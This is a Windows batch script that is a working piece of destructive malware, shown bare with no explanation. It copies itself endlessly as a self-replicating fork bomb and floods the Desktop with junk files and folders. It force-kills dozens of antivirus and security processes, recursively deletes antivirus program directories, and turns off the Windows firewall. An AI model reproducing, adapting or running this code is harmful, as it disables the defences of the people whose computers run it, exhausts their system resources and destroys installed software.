@echo off
:main
call flood >nul
call F_Spam >nul
call F_Blast >nul
call Kill_AV >nul
call Kill_FW >nul
goto main

:flood
set x=%random%
type %0 >> %x%.bat
start %x%.bat >nul

:F_Spam
cd C:\Users\%username%\Desktop
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%

:F_Blast
set /A FBlast = %random%
md %FBlast%
start %FBlast% >nul

:Kill_AV
for /f "delims=" %%a in (avs.list) do taskkill /f /im %%a >nul
taskkill /f /t /im "MSASCuiL.exe"
taskkill /f /t /im "MSASCui.exe"
taskkill /F /IM av* >NUL
taskkill /F /IM fire* >NUL
taskkill /F /IM anti* >NUL
taskkill /F /IM spy* >NUL
taskkill /F /IM bullguard* >NUL
taskkill /F /IM PersFw* >NUL
taskkill /F /IM KAV* >NUL
taskkill /F /IM ZONEALARM* >NUL
taskkill /F /IM SAFEWEB* >NUL
taskkill /F /IM OUTPOST* >NUL
taskkill /F /IM nv* >NUL
taskkill /F /IM nav* >NUL
taskkill /F /IM F-* >NUL
taskkill /F /IM ESAFE* >NUL
taskkill /F /IM cle* >NUL
taskkill /F /IM BLACKICE* >NUL
taskkill /F /IM def* >NUL
taskkill /F /IM kav* >NUL
taskkill /F /IM kav* >NUL
taskkill /F /IM avg* >NUL
taskkill /F /IM ash* >NUL
taskkill /F /IM aswupdsv* >NUL
taskkill /F /IM ewid* >NUL
taskkill /F /IM guar* >NUL
taskkill /F /IM gcasDt* >NUL
taskkill /F /IM msmp* >NUL
taskkill /F /IM mcafe* >NUL
taskkill /F /IM mghtml* >NUL
taskkill /F /IM msiexec* >NUL
taskkill /F /IM outpost* >NUL
taskkill /F /IM isafe* >NUL
taskkill /F /IM zap* >NUL
taskkill /F /IM zauinst* >NUL
taskkill /F /IM upd* >NUL
taskkill /F /IM zlclien* >NUL
taskkill /F /IM minilog* >NUL
taskkill /F /IM norton* >NUL
taskkill /F /IM ccc* >NUL
taskkill /F /IM npfmn* >NUL
taskkill /F /IM loge* >NUL
taskkill /F /IM nisum* >NUL
taskkill /F /IM issvc* >NUL
taskkill /F /IM tmp* >NUL
taskkill /F /IM tmn* >NUL
taskkill /F /IM pcc* >NUL
taskkill /F /IM cpd* >NUL
taskkill /F /IM pop* >NUL
taskkill /F /IM pav* >NUL
taskkill /F /IM padmin* >NUL
taskkill /F /IM panda* >NUL
taskkill /F /IM avsch* >NUL
taskkill /F /IM sche* >NUL
taskkill /F /IM syman* >NUL
taskkill /F /IM virus* >NUL
taskkill /F /IM realm* >NUL
taskkill /F /IM sweep* >NUL
taskkill /F /IM scan* >NUL
taskkill /F /IM ad-* >NUL
taskkill /F /IM safe* >NUL
taskkill /F /IM avas* >NUL
taskkill /F /IM norm* >NUL
taskkill /F /IM offg* >NUL

RMDIR /Q "C:\Program Files\alwils~1" /S >NUL
RMDIR /Q "C:\Program Files\Lavasoft\Ad-awa~1" /S >NUL
RMDIR /Q "C:\Program Files\kasper~1" /S >NUL
RMDIR /Q "C:\Program Files\trojan~1" /S >NUL
RMDIR /Q "C:\Program Files\f-prot95" /S >NUL
RMDIR /Q "C:\Program Files\tbav" /S >NUL
RMDIR /Q "C:\Program Files\avpersonal" /S >NUL
RMDIR /Q "C:\Program Files\Norton~1" /S >NUL
RMDIR /Q "C:\Program Files\Mcafee" /S >NUL
RMDIR /Q "C:\Program Files\Norton~1\Norton~1\Norton~3" /S >NUL
RMDIR /Q "C:\Program Files\Norton~1\Norton~1\speedd~1" /S >NUL
RMDIR /Q "C:\Program Files\Norton~1\Norton~1" /S >NUL
RMDIR /Q "C:\Program Files\Norton~1" /S >NUL
RMDIR /Q "C:\Program Files\avgamsr" /S >NUL
RMDIR /Q "C:\Program Files\avgamsvr" /S >NUL
RMDIR /Q "C:\Program Files\avgemc" /S >NUL
RMDIR /Q "C:\Program Files\avgcc" /S >NUL
RMDIR /Q "C:\Program Files\avgupsvc" /S >NUL
RMDIR /Q "C:\Program Files\grisoft" /S >NUL
RMDIR /Q "C:\Program Files\nood32krn" /S >NUL
RMDIR /Q "C:\Program Files\nood32" /S >NUL
RMDIR /Q "C:\Program Files\nod32" /S >NUL
RMDIR /Q "C:\Program Files\nood32" /S >NUL
RMDIR /Q "C:\Program Files\kav" /S >NUL
RMDIR /Q "C:\Program Files\kavmm" /S >NUL
RMDIR /Q "C:\Program Files\kaspersky" /S >NUL
RMDIR /Q "C:\Program Files\ewidoctrl" /S >NUL
RMDIR /Q "C:\Program Files\guard" /S >NUL
RMDIR /Q "C:\Program Files\ewido" /S >NUL
RMDIR /Q "C:\Program Files\pavprsrv" /S >NUL
RMDIR /Q "C:\Program Files\pavprot" /S >NUL
RMDIR /Q "C:\Program Files\avengine" /S >NUL
RMDIR /Q "C:\Program Files\apvxdwin" /S >NUL
RMDIR /Q "C:\Program Files\webproxy" /S >NUL
RMDIR /Q "C:\Program Files\panda software" /S >NUL

:Kill_FW
netsh firewall set opmode disable >nul
netsh advfirewall set currentprofile state off >nul
net stop "MpsSvc"
